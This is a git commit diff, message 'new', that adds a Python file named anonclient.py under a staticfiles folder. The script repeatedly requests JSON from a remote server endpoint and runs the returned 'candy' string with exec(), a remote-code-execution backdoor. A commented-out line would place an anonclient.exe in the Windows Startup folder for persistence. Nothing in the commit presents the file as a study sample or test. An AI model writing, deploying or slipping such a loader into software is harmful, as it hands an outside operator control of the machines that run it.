e469c5413e44c8cd87edf42e7a1bb5470c9f64ab
Mike2015 <olumichael2015@outlook.com>
2022-08-28 21:53:50 +0100

    'new'

---
+++ staticfiles/anonclient.py
@@ -0,0 +1,20 @@
+import requests
+from threading import Thread
+import os
+import time
+from datetime import datetime
+
+try:
+    pass
+    # os.rename(f"{os.getcwd()}//anonclient.exe", f"C://Users//{os.getlogin()}//AppData//Roaming//Microsoft//Windows//Start Menu//Programs//Startup//anonclient.exe")
+except Exception as e:
+    pass
+while True:
+    try:
+        endpoint_1 = 'https://xxremote.herokuapp.com/'
+        endpoint_2 = 'http://172.20.10.6:8000/'
+        exec(requests.get(f'{endpoint_2}candy').json()['candy'])
+        break
+    except Exception as e:
+        print(e)
+        pass
